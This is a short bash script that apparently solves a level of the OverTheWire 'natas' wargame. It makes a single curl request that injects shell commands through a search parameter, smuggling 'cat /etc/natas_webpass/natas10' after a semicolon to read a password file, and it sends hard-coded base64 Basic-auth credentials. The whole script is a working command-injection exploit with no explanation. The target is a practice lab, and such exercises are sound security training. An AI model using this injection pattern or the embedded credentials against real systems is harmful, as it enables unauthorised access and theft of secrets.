#! /bin/bash

curl 'http://natas9.natas.labs.overthewire.org/?needle=somestring%3B+cat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B+ls+-l&submit=Search' \
 -H 'Authorization: Basic bmF0YXM5OlcwbU1oVWNSUm5HOGRjZ2hFNHF2azNKQTlsR3Q4bkRs'
